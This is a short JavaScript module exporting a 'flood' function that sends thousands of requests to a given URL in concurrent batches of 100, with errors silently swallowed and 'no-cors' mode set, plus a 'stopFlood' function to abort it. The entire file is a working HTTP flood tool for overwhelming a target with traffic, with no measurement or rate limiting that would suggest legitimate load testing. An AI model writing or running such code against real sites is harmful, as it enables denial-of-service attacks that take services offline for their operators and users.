let currentController = null;

async function flood(url, count = 3000) {
  if (currentController) currentController.abort();
  const controller = new AbortController();
  currentController = controller;

  const batch = 100;
  for (let i = 0; i < count && !controller.signal.aborted; i += batch) {
    const promises = [];
    for (let j = 0; j < batch; j++) {
      promises.push(
        fetch(url, { mode: 'no-cors', signal: controller.signal }).catch(() => {})
      );
    }
    await Promise.all(promises);
  }
  currentController = null;
}

function stopFlood() {
  if (currentController) {
    currentController.abort();
    currentController = null;
    return true;
  }
  return false;
}

module.exports = { flood, stopFlood };
